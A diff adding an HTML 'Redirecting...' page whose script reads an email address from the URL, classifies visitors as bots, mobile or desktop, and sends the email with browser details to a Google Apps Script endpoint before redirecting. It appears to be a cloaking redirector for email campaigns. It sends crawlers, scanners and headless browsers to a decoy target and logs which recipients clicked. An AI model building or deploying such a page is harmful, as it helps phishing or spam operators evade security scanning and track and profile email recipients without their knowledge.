@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting...</title>
+    <script>
+        // Конфигурация
+        const DESKTOP_REDIRECT = "https://google.com";
+        const MOBILE_REDIRECT = "https://amazon.com";
+        const BOT_REDIRECT = "https://amazon.com";
+        const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbw9GNjReI07TgYFe-eO7_nzxnZnUYdubdpPojL7ji8rQZlxn4HMt4obRFOBs_cA5NbvIA/exec";
+
+        // Функции определения
+        function isMobile() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        function isBot() {
+            const userAgent = navigator.userAgent;
+            const botPatterns = [
+                /bot/i, /crawl/i, /spider/i, /slurp/i, 
+                /search/i, /http/i, /python/i, /curl/i,
+                /wget/i, /scrapy/i, /phantom/i, /headless/i,
+                /archive/i, /index/i, /scan/i, /monitoring/i
+            ];
+            
+            // Дополнительные проверки для ботов
+            const isBotByAgent = botPatterns.some(pattern => pattern.test(userAgent));
+            const isBotByBehavior = !('ontouchstart' in window) && window.outerWidth === 0 && window.outerHeight === 0;
+            
+            return isBotByAgent || isBotByBehavior;
+        }
+
+        // Получение параметров из URL
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search.substring(1);
+            const regex = /([^&=]+)=([^&]*)/g;
+            let match;
+            
+            while (match = regex.exec(queryString)) {
+                params[decodeURIComponent(match[1])] = decodeURIComponent(match[2]);
+            }
+            
+            return params;
+        }
+
+        // Отправка данных в Google Sheets
+        function sendToGoogleSheets(data) {
+            if (!GOOGLE_SHEET_URL.includes('ВАШ_СКРИПТ')) {
+                fetch(GOOGLE_SHEET_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify(data)
+                });
+            }
+        }
+
+        // Основная функция
+        function init() {
+            const params = getUrlParams();
+            const email = params.email || 'unknown';
+            const isMobileDevice = isMobile();
+            const isBotUser = isBot();
+            
+            // Определение типа трафика и редирект
+            let redirectUrl, userType;
+            
+            if (isBotUser) {
+                redirectUrl = BOT_REDIRECT;
+                userType = 'bot';
+            } else if (isMobileDevice) {
+                redirectUrl = MOBILE_REDIRECT;
+                userType = 'mobile';
+            } else {
+                redirectUrl = DESKTOP_REDIRECT;
+                userType = 'desktop';
+            }
+            
+            // Сбор данных для статистики
+            const analyticsData = {
+                email: email,
+                userType: userType,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString(),
+                referrer: document.referrer || 'direct',
+                language: navigator.language,
+                platform: navigator.platform
+            };
+            
+            // Отправка статистики
+            sendToGoogleSheets(analyticsData);
+            
+            // Редирект
+            setTimeout(() => {
+                window.location.href = redirectUrl;
+            }, 500); // Небольшая задержка для отправки данных
+        }
+
+        // Запуск при загрузке
+        window.onload = init;
+    </script>
+</head>
+<body>
+    <p>Redirecting...</p>
+</body>
+</html>
